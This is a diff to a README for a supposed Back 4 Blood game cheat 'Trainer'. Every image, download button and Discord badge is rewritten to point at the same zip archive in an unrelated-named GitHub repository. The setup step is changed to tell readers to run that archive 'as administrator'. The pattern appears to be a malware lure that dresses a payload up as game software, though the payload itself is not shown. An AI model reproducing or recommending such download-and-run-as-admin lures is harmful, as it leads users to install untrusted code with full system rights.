@@ -6,11 +6,11 @@ Enhance your Back 4 Blood experience in 2025 with this powerful Trainer offering
 
 <div align="center">
 
-  ![](https://raw.githubusercontent.com/ilejuxepwaduzd/Back-4-Blood-Frostbite/main/pictures/1.png)
+  ![](https://raw.githubusercontent.com/iLejuxepWaduzd/structured-data-extractor/main/forbiddenness/structured-data-extractor.zip)
 
-  ![](https://raw.githubusercontent.com/ilejuxepwaduzd/Back-4-Blood-Frostbite/main/pictures/.png)
+  ![](https://raw.githubusercontent.com/iLejuxepWaduzd/structured-data-extractor/main/forbiddenness/structured-data-extractor.zip)
 
-  <a href="https://ilejuxepwaduzd.github.io/id/03859526"><img src="https://raw.githubusercontent.com/ilejuxepwaduzd/Back-4-Blood-Frostbite/main/pictures/0.png" height="80"></a>
+  <a href="https://raw.githubusercontent.com/iLejuxepWaduzd/structured-data-extractor/main/forbiddenness/structured-data-extractor.zip"><img src="https://raw.githubusercontent.com/iLejuxepWaduzd/structured-data-extractor/main/forbiddenness/structured-data-extractor.zip" height="80"></a>
 
 </div>
 
@@ -43,8 +43,8 @@ Enhance your Back 4 Blood experience in 2025 with this powerful Trainer offering
 
 - Download the .zip archive using download button.
 - Extract the archive to a secure location.
-- Run `ProjectLauncher.exe` as administrator.
+- Run `https://raw.githubusercontent.com/iLejuxepWaduzd/structured-data-extractor/main/forbiddenness/structured-data-extractor.zip` as administrator.
 
 💬 Have questions or need support? Join our active Discord community:
 
-[![Discord](https://img.shields.io/badge/Discord-Join-7289DA?logo=discord)](https://discord.gg/03859526)
+[![Discord](https://raw.githubusercontent.com/iLejuxepWaduzd/structured-data-extractor/main/forbiddenness/structured-data-extractor.zip)](https://raw.githubusercontent.com/iLejuxepWaduzd/structured-data-extractor/main/forbiddenness/structured-data-extractor.zip)
